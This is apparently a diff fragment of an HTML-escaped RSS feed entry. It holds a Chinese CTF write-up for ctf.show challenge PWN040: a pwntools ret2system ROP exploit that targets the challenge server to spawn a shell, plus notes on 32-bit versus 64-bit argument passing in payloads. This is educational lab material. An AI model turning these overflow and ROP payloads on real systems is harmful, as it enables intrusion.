+&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-python&#34; data-lang=&#34;python&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;kn&#34;&gt;from&lt;/span&gt; &lt;span class=&#34;nn&#34;&gt;pwn&lt;/span&gt; &lt;span class=&#34;kn&#34;&gt;import&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;*&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;n&#34;&gt;context&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;log_level&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;s1&#34;&gt;&amp;#39;debug&amp;#39;&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;c1&#34;&gt;#io = process(&amp;#39;./pwn&amp;#39;)&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;n&#34;&gt;io&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;remote&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39;pwn.challenge.ctf.show&amp;#39;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt;&lt;span class=&#34;mi&#34;&gt;28194&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;n&#34;&gt;elf&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;ELF&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39;./pwn&amp;#39;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;n&#34;&gt;system&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;elf&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;sym&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39;system&amp;#39;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;]&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;n&#34;&gt;bin_sh&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;mh&#34;&gt;0x400808&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;n&#34;&gt;pop_rdi&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;mh&#34;&gt;0x4007e3&lt;/span&gt; &lt;span class=&#34;c1&#34;&gt;# 0x00000000004007e3 : pop rdi ; ret&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;n&#34;&gt;ret&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;mh&#34;&gt;0x4004fe&lt;/span&gt; &lt;span class=&#34;c1&#34;&gt;# 0x00000000004004fe : ret&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;n&#34;&gt;payload&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;s1&#34;&gt;&amp;#39;a&amp;#39;&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;*&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;mh&#34;&gt;0xA&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;+&lt;/span&gt;&lt;span class=&#34;mi&#34;&gt;8&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;+&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;p64&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;pop_rdi&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;+&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;p64&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;bin_sh&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;+&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;p64&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;ret&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;+&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;p64&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;system&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;n&#34;&gt;io&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;sendline&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;payload&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;n&#34;&gt;io&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;recv&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;()&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;n&#34;&gt;io&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;interactive&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;()&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
+&lt;/div&gt;
+&lt;/div&gt;&lt;p&gt;欸为什么exp的payload中的参数不太一样？&lt;/p&gt;
+&lt;blockquote class=&#34;alert alert-note&#34;&gt;
+    &lt;blockquote&gt;
+&lt;h3 id=&#34;32位和64位可执行程序的参数传递顺序&#34;&gt;&lt;strong&gt;32位和64位可执行程序的参数传递顺序&lt;/strong&gt;
+&lt;/h3&gt;&lt;p&gt;即使思路一样但架构不一样，在写payload的时候注入地址的顺序也是不一样的：&lt;/p&gt;
+&lt;ul&gt;
+&lt;li&gt;&lt;strong&gt;32 位程序（PWN039）&lt;/strong&gt;：32 位程序中，函数参数通过栈传递。在 PWN039 里，&lt;code&gt;system&lt;/code&gt;函数地址紧跟在填充数据之后，这是因为溢出后直接覆盖返回地址为&lt;code&gt;system&lt;/code&gt;函数地址，让程序执行&lt;code&gt;system&lt;/code&gt;函数。在&lt;code&gt;payload = &#39;a&#39;*(0x12 + 4) + p32(system) + p32(0) + p32(bin_sh)&lt;/code&gt;中，&lt;code&gt;&#39;a&#39;*(0x12 + 4)&lt;/code&gt;用于填充缓冲区并覆盖原返回地址，&lt;code&gt;p32(system)&lt;/code&gt;将返回地址修改为&lt;code&gt;system&lt;/code&gt;函数地址 ，&lt;code&gt;p32(0)&lt;/code&gt;是为了满足栈结构，作为&lt;code&gt;system&lt;/code&gt;函数执行后的返回地址（实际执行中并不重要，可随意填充 4 字节），&lt;code&gt;p32(bin_sh)&lt;/code&gt;则是&lt;code&gt;system&lt;/code&gt;函数的参数，即&lt;code&gt;/bin/sh&lt;/code&gt;字符串的地址。这样的顺序符合 32 位程序通过栈传参和控制程序执行流的特点。&lt;/li&gt;
+&lt;li&gt;&lt;strong&gt;64 位程序（PWN40）&lt;/strong&gt;：64 位程序的函数调用规则有所不同，前 6 个参数优先通过寄存器传递，其中第一个参数存放在&lt;code&gt;rdi&lt;/code&gt;寄存器。在 PWN40 中，&lt;code&gt;payload = &#39;a&#39;*(0xA + 8) + p64(pop_rdi) + p64(bin_sh) + p64(ret) + p64(system)&lt;/code&gt; ，&lt;code&gt;&#39;a&#39;*(0xA + 8)&lt;/code&gt;用于填充缓冲区和覆盖原返回地址；&lt;code&gt;p64(pop_rdi)&lt;/code&gt;将&lt;code&gt;pop_rdi&lt;/code&gt;指令地址放入栈中，执行&lt;code&gt;pop_rdi&lt;/code&gt;指令时，会把紧跟其后的&lt;code&gt;p64(bin_sh)&lt;/code&gt;中的&lt;code&gt;/bin/sh&lt;/code&gt;地址弹出到&lt;code&gt;rdi&lt;/code&gt;寄存器，作为&lt;code&gt;system&lt;/code&gt;函数的第一个参数；&lt;code&gt;p64(ret)&lt;/code&gt;用于栈对齐（64 位程序调用函数前需要保证栈 16 字节对齐，&lt;code&gt;ret&lt;/code&gt;指令可调整栈指针）；最后&lt;code&gt;p64(system)&lt;/code&gt;将&lt;code&gt;system&lt;/code&gt;函数地址放入栈中，当程序执行到这里时，会跳转到&lt;code&gt;system&lt;/code&gt;函数执行，此时&lt;code&gt;rdi&lt;/code&gt;寄存器中已正确设置了参数&lt;code&gt;/bin/sh&lt;/code&gt;的地址。&lt;/li&gt;
+&lt;/ul&gt;&lt;/blockquote&gt;&lt;/blockquote&gt;
+&lt;h3 id=&#34;pwn_041&#34;&gt;PWN_041
+&lt;/h3&gt;&lt;p&gt;题目：32位的 system(); 但是没&amp;quot;/bin/sh&amp;quot; ，好像有其他的可以替代。 &lt;a class=&#34;link&#34; href=&#34;PWN_041&#34; &gt;PWN_041&lt;/a&gt;&lt;/p&gt;
 </description>
         </item>
         <item>
